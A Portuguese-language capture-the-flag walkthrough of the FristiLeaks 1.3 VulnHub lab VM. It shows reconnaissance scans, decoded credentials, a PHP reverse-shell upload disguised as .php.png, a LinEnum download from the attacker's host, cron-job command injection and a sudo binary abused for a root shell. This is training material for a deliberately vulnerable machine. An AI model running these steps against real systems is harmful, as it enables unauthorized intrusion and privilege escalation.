---
layout: default
---

# FristiLeaks: 1.3

[Download](https://www.vulnhub.com/entry/fristileaks-13,133/)


**Name:** FristiLeaks: 1.3

**Date release:** 14 Dec 2015

**Description:**

Uma pequena VM foi feita para um encontro de hackers informais holandeses chamado Fristileaks. Pretende ser quebrado em poucas horas sem exigir depuradores, engenharia reversa, etc.

**NOTE:** Os usuários do VMware precisarão editar manualmente o endereço MAC da VM para: `08:00:27:A5:A6:76`

### Table of Contents

- [Information Gathering](#information-gathering)
    - [Route Analysis](#route-analysis)
        - [Netdiscover](#netdiscover)
    - [Nmap](#nmap)
- [Web Application Analysis](#web-application-analysis)
    - [Nikto](#nikto)
    - [Web Crawlers & Directory Bruteforce](#web-crawlers-&-directory-bruteforce)
        - [CeWL](#cewl)
        - [Dirsearch](#dirsearch)
- [Exploitation Tools](#exploitation-tools)
    - [Base64](#base64)
    - [Bypass](#bypass)
    - [Reverse Shell](#reverse-shell)
- [Privilege Escalation](#privilege-escalation)
    - [Spawn Shell](#spawn-shell)
    - [Upgrading to a fully interactive reverse shell](#upgrading-to-a-fully-interactive-reverse-shell)
    - [File Transfer](#file-transfer)
    - [LinEnum](#linenum)
    - [Automated Checks - User admin](#automated-checks---user-admin)
    - [Decoder - User fristigod](#decoder---user-fristigod)
    - [Sudo - Get root](#sudo---get-root)

## Information Gathering

### Route Analysis

#### Netdiscover

Iniciamos obtendo algumas informações necessárias para podermos continuar, ou seja, precisamos fazer o levantamento de informações. Como não foi passado nosso `target`, precisamos descobrir qual `IP` esta associado a máquina vuln.

`netdiscover -i eth0 -r 10.0.1.0/24`

![netdiscover1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_09-05.png)

### Nmap

Depois de obter nosso alvo, podemos usar o `nmap` e iniciar a enumeração e assim pegar mais informações. Por exemplo: Portas abertas, versões de serviços e etc.

`nmap -sV -sC -oA nmap/initial 10.0.1.110`

![nmap1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_17-46.png)

Como podemos observar a porta `80` esta aberta e possui o serviço `http`, com  servidor web server apache na versão `Apache httpd 2.2.15`, e uma distribuição `CentOS`, possui também o robots.txt com 3 entradas não permitidas. Vamos analisar melhor isso.

## Web Application Analysis

### Nikto

`nikto -C all -host 10.0.1.110 -output nikto_init_port_80.txt`

![nikto1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_09-52.png)

### Web Crawlers & Directory Bruteforce

#### CeWL

Inicialmente eu tentei diversas wordlists e não encontrava nada, voltei ao tempo e criei uma `wordlist` personalizada com o `CeWL` e assim tentei encontrar algo interessante.

`cewl -w customwordlist.txt -d 2 -m 4 10.0.1.110 -o -v`

#### Dirsearch

`python3 /opt/dirsearch/dirsearch.py -u http://10.0.1.110/ -w customwordlist.txt -e php -x 403`

![dirsearch1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_10-39.png)

Algo interessante depois de nossa wordlist personalizada, navegando ate o `fristi` encontramos uma página de login, lol. Evoluímos!!!

![login1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_10-46.png)

## Exploitation Tools

### Base64

Olhando o source da página podemos ver um comentário, de acordo com minha experiencia me parece um base64. Vamos decodar isso e ver o que encontramos.

![source1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_10-53.png)

Então pegamos o comentário do source, e inserimos em um arquivo. No meu caso criei um file com o seguinte nome `source.b64` e em seguida realizei o decoder.

`cat source.b64 |base64 -d`

![decoder1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_10-58.png)

Observe no início do arquivo que tem escrito `PNG`. Bom, vamos decodar novamente mas agora redirecionando a saída para um arquivo no formato `.png`

`cat source.b64 |base64 -d > file_source.png`

![pass1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_11-09.png)

Agora temos uma possível senha, vamos ver como podemos usar. De imediato tentei usar com o user admin, mas não obtive êxito. Voltando no source novamente encontrei um possível usuário.

![user1](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_11-16.png)

`eezeepz:keKkeKKeKKeKkEkkEk`

Então temos fazer login novamente na página.

![login2](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_11-21.png)

Bingoo! Realizado o login na página!

![bingo](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_11-21_1.png)

Agora temos uma página para realizar uploads. Precisamos fazer bypass e assim poder obter uma reverse shell.

![upload](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_11-24.png)

### Bypass

Como falei anteriormente precisamos encontrar uma maneira de fazer o bypass. Sera utilizado o `php-reverse-shell` default do kali, edite conforme suas configurações adicionando IP e PORT de sua escolha. Em seguida mova para `.php.png`

`mv php-reverse-shell.php5 shellv.php.png`

### Reverse Shell

Depois de realizado as configurações necessárias, você deve colocar a porta escolhida em modo `listen` e fazer o upload do arquivo modificado. Assim que realizar isso, acesse o arquivo enviado no dir `/fristi/uploads/seuarquivo.php.png` feito isso você terá uma `shell`.

![upp](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-24.png)

Acesse o arquivo e obtenha uma `revshell`.

![shell](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-26.png)

## Privilege Escalation

### Spawn Shell

`/usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'`

![spawn](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-35.png)

### Upgrading to a fully interactive reverse shell

```
Ctrl + Z
bash-4.1$ ^Z     
[1]+  Stopped                 nc -lvp 6464
```
`$ stty -echo raw`

`$ fg`

![stty](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-37.png)

Com uma shell interativa completa fica bem mais fácil de trabalhar, você pode usar o `TAB`, pode usar o `Ctrl + C` e você não perde sua shell.

### File Transfer

Poderíamos partir logo para kernel explotation, mas antes vamos rodar o Linenum, mas precisamos antes transferir para nosso alvo.

`systemctl start apache2`

`locate LinEnum`

Se você não tem o LinEnum em sua máquina, você pode realizar o download. [AQUI](https://github.com/PentestMafia/LinEnum)

`cp /root/fatec/172.17.0.2/download/LinEnum.sh /var/www/html/`

Na máquina alvo realize o download.

`wget http://10.0.1.104/LinEnum.sh`

![trasnfer](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-50.png)

### LinEnum

Adicione permissão para executar.

`chmod +x LinEnum.sh`

Agora execute o `./LinEnum`

![linenum](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-05.png)

Possíveis vetores de ataques.

`Sudo version 1.8.6p3`

![sudo](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-17.png)

`kernel - Linux version 2.6.32-573.8.1.el6.x86_64`

![kernel](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-20.png)

Existe outros usuários, vamos verificar mais de perto.

![users](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-22.png)

### Automated Checks - User admin

Dentro do `/home/eezeepz` encontramos umas anotações.

![notes](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-14.png)

```
bash-4.1 $ cat notes.txt
Yo EZ,

Eu fiz o possível para você fazer algumas verificações automatizadas,
Mas eu permiti apenas o acesso aos binários do sistema /usr/bin/*. Eu fiz
no entanto copiar alguns comandos extras freqüentemente necessários para o meu
homedir: chmod, df, gato, eco, ps, grep, egrep para que você possa usá-los de /home/admin/

Não esqueça de especificar o caminho completo para cada binário!

Basta colocar um arquivo chamado "runthis" em /tmp/, cada linha um comando. 
A saída vai para o arquivo "cronresult" em / tmp /. 
Deveria executar cada minuto com privilégios de minha conta.

- Jerry
```

Bom, de acordo com as anotações podemos utilizar os comandos disponíveis no `/home/admin`, sendo assim utilizando o `chmod`  podemos dar permissão total para qualquer pessoa acessar o home do admin.

`echo "/home/admin/chmod -R 777 /home/admin/" > /tmp/runthis`

![perm](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-42.png)

Veja, depois de alguns minutos as permissões foram alteradas, permitindo qualquer pessoa acessar o `/home/admin`.

### Decoder - User fristigod

Depois de acessar o admin encontramos um arquivo com o texto criptografado.

![encode](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_16-13.png)

Também podemos ver o encode.

![cryp](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_16-33.png)

Depois de olhar o encode, podemos programar o decoder e assim obter o texto legível.

![decode](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_16-17.png)

lol, temos o texto legível!!

![password](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_16-27.png)

Sabemos que existe 3 users, temos acesso ao `admin` e `eezeepz` ainda falta o `fristigod`. Podemos ver em nosso home para você lembrar, depois vamos mudar de usuário utilizando a senha que conseguimos decodar, ou seja, vamos atras do `fristigod`.

`fristigod:LetThereBeFristi!`

`su fristigod`

![fristgod](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_16-40.png)

### Sudo - Get root

Como de costume, apos realizar a enumeração básica e verificar o `sudo -l` podemos ver que existe um programa que executa com permissão de root com o usuario `fristi` setado, vamos analisar mais de perto e ver como podemos escalar o privilegio com ele.

![sudo](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_16-55.png)

`sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom`

Observe o modo de uso, execute o programa junto do comando desejado. 

`Usage: ./program_name terminal_command ...`

Obvio, vamos passar o `/bin/bash`

`sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash`

![root](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_17-03.png)

GG!!! hello hello how low......

Obtemos o root com sucesso!
